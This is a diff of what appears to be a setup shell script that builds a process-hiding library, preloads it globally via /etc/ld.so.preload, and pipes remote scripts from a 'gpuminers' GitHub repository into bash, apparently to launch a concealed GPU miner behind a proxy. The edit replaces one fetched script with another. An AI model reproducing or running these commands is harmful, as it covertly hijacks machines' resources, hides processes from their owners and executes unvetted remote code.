@@ -9,5 +9,5 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/start_gmiEthermWsocks4.sh | bash
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installerWsocks4.sh | bash
 graftcp ./gmi_flex.sh
